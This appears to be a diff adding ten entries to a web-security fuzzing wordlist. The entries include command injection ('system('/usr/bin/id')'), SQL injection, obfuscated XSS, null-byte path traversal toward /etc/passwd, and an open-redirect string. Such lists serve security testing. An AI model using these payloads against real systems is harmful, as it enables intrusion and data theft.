@@ -1,0 +1,10 @@
+navigator.vibrate(500)
+;system('/usr/bin/id')
+<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
+/etc/httpd/logs/error_log
+onwheel
+&#X000003C;
+\x3c
+1' ORDER BY 1,2,3--+
+/////example.com
+etc%2fpasswd%00
